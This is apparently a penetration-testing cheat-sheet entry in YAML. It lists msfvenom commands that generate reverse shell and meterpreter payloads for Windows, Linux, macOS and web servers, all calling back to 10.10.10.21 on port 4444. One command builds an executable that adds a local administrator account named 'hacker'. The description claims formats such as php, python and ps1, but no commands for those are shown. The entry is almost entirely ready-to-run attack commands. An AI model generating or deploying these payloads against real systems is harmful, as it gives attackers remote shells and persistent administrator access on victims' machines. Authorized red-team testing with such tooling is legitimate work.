---
description: |
  Generate reverse shell payloads with msfvenom for Windows, Linux, macOS, and web applications in various formats (exe, elf, macho, dll, msi, php, python, asp, aspx, war, hta, ps1). All payloads use LHOST=10.10.10.21, LPORT=4444.
command: |
  # --- Windows ---
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f exe -o reverse.exe
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f exe -o meterpreter.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f dll -o hijack.dll
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f msi -o shell.msi
  msfvenom -p windows/exec CMD='net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add' -f exe -o addadmin.exe

  # --- Linux ---
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f elf -o reverse.elf
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f elf -o meterpreter.elf

  # --- macOS ---
  msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f macho -o reverse.macho

  # --- Web ---
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f aspx -o shell.aspx
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f jsp -o shell.jsp
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f war -o shell.war
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
  - macOS
services: []
techniques: []
references:
  - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
---
